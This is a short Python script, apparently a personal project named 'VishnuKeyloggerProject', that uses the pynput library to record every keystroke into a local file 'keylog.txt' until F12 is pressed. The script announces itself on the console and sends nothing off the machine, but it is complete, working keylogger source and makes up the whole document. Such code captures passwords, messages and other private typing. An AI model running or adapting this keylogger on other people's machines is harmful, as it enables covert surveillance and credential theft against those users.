#VishnuKeyloggerProject_Python

from pynput import keyboard
from datetime import datetime


log_file = "keylog.txt"


STOP_KEY = keyboard.Key.f12  


def on_press(key):
    try:
        with open(log_file, "a") as f:
            f.write(f"{key.char}")
    except AttributeError:
        with open(log_file, "a") as f:
            f.write(f"[{key}]")


def on_release(key):
    if key == STOP_KEY:
        with open(log_file, "a") as f:
            f.write(f"\n[Logger Stopped at {datetime.now()}]\n")
        print(f"\nLogger stopped by pressing {STOP_KEY}.")
        return False 


print("Keylogger is running... Press F12 to stop.")


with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()